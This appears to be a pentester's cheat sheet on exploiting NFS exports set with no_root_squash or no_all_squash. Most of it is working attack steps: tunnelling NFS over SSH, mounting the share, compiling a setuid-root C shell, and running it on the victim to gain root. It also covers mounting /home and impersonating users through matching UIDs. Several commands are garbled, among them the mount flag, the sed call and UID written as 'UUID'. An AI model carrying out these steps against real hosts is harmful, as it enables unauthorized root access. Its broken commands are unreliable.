NFS Vulns

Read the /etc/exports file, if you find some directory that is configured as no\_root\_squash, then you can access it from as a client and write inside that directory as if you were the local root of the machine.

no\_root\_squash: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications.

no\_all\_squash: This is similar to no\_root\_squash option but applies to non-root users. Imagine, you have a shell as nobody user; checked /etc/exports file; no\_all\_squash option is present; check /etc/passwd file; emulate a non-root user; create a suid file as that user (by mounting using nfs). Execute the suid as nobody user and become different user.

<ins>NFS; no\_root\_squash, insecure, rw</ins>

If /etc/exports have a line e.g.

> /srv/pelota 192.168.42.0/24(insecure,rw)
> /srv/pelota 127.0.0.1/32(no\_root\_squash,insecure,rw)

Then NFS is being exported and you have ssh access to the machine. You can use your attacker machine (login as root) to run:

> ssh -f -N megumin@192.168.42.43 -L 2049:127.0.0.1:2049
> mount -t nfs 127.0.0.1:/srv/pelota my_share
> cd my_share
> cat > shell.c<<EOF
> #include &lt;unistd.h&gt;
> int main(){
> setuid(0);
> setgid(0);
> system("/bin/bash");
> }
> EOF
> gcc shell.c -o shell
> chmod u+s shell

Now inside a ssh session on the victim machine i.e. 192.168.42.32 in this case

> cd /srv/pelota
> ./shell
> 
> Use 'id' to identify what user you are

If you wish to use NSE scripts:nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254

This case -- /home is being shared, and can be accessed by mounting it on our kali machine.

To do so:

> mkdir home;
> 
> sudo mount -I nolock $IP/home ~/home/;

- -nolock will disable file locking

If we try to view files within that mounted folder, there won't be any permissions granted

What we can do is to replicate the user by creating a user with the same UUID, su to that user and access the file

> sudo adduser pwn; sudo sed 0u 0e 's/$Created\_UUID/$permission\_UUID/g' /etc/passwd; su pwn; cat $file
